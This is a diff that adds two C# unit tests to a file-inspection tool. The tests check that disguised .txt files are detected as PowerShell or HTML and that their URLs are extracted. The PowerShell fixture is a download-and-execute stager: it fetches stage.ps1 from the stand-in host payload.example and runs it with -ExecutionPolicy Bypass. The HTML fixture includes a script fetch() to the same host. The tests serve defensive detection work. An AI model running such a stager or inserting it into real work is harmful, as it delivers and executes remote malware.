@@ -68,4 +68,48 @@ public class ReferencesTests
             Assert.DoesNotContain(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, late, StringComparison.OrdinalIgnoreCase));
         } finally { try { File.Delete(p); } catch { } }
     }
+
+    [Fact]
+    public void Extract_ScriptReferences_From_Disguised_Text_File_Uses_Detected_Type()
+    {
+        var p = Path.GetTempFileName() + ".txt";
+        try
+        {
+            File.WriteAllText(p, """
+                Invoke-WebRequest -Uri https://payload.example/stage.ps1 -OutFile C:\Windows\Temp\stage.ps1
+                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\stage.ps1"
+                """);
+
+            var a = FileInspector.Analyze(p);
+            var refs = a.References ?? Array.Empty<Reference>();
+
+            Assert.Equal("ps1", a.DetectedExtension);
+            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/stage.ps1", StringComparison.OrdinalIgnoreCase));
+            Assert.Contains(refs, r => string.Equals(r.SourceTag, "script:ps1", StringComparison.OrdinalIgnoreCase));
+        }
+        finally { try { File.Delete(p); } catch { } }
+    }
+
+    [Fact]
+    public void Extract_HtmlReferences_From_Disguised_Text_File_Uses_Detected_Type()
+    {
+        var p = Path.GetTempFileName() + ".txt";
+        try
+        {
+            File.WriteAllText(p, """
+                <html><body>
+                <a href="https://contoso.example/report">report</a>
+                <script>fetch("https://payload.example/app.js");</script>
+                </body></html>
+                """);
+
+            var a = FileInspector.Analyze(p);
+            var refs = a.References ?? Array.Empty<Reference>();
+
+            Assert.Equal("html", a.DetectedExtension);
+            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://contoso.example/report", StringComparison.OrdinalIgnoreCase));
+            Assert.Contains(refs, r => string.Equals(r.SourceTag, "html:href", StringComparison.OrdinalIgnoreCase));
+        }
+        finally { try { File.Delete(p); } catch { } }
+    }
 }
